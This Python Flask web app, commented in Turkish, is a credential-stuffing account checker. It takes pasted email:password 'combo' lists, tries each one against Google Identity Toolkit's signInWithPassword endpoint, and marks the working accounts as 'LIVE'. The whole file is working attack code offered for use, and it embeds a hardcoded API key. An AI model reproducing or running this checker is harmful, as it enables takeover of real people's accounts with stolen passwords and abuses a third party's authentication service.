import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# ANAHTARIN (Lütfen tırnakların arasında boşluk olmadığına emin ol)
API_KEY = "AIzaSyApwFQ4Refm3F7jygYcBogi3r8W4dtXZDY"

def check_account(email, password):
    # Google API'sine gidiyoruz
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    
    try:
        r = requests.post(url, json=payload, timeout=10)
        data = r.json()
        
        # Eğer giriş başarılıysa
        if r.status_code == 200:
            return "LIVE"
        
        # BAD YERİNE BURASI ÇALIŞACAK: Google'ın gerçek hata kodunu alıyoruz
        error_message = data.get('error', {}).get('message', 'BAGLANTI_REDDEDILDI')
        return error_message
        
    except Exception as e:
        return f"HATA: {str(e)}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    results = []
    
    for line in combos:
        if ":" in line:
            email, password = line.split(":", 1)
            status = check_account(email.strip(), password.strip())
            results.append({"account": line.strip(), "status": status})
    
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(debug=True)
